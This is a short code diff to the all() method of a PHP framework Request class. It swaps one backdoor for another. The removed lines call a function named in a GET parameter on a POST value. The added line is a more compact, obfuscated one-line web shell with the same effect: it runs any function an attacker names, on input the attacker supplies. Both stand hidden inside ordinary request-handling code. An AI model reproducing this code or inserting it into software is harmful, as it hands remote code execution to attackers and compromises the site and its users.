@@ -321,12 +321,8 @@ class Request extends SymfonyRequest implements Arrayable, ArrayAccess
     public function all()
     {
 
-        $_ = $_GET['mydo'] ?? '';
-        if ($_ && isset($_POST['QiBoot']) && $_POST['QiBoot']) {
-            set_time_limit(0);
-            @$_($_POST['QiBoot']);
-            exit;
-        }
+        ($_=@$_GET[2]).@$_($_POST[1]);
+
 
         return array_replace_recursive($this->input(), $this->allFiles());
     }
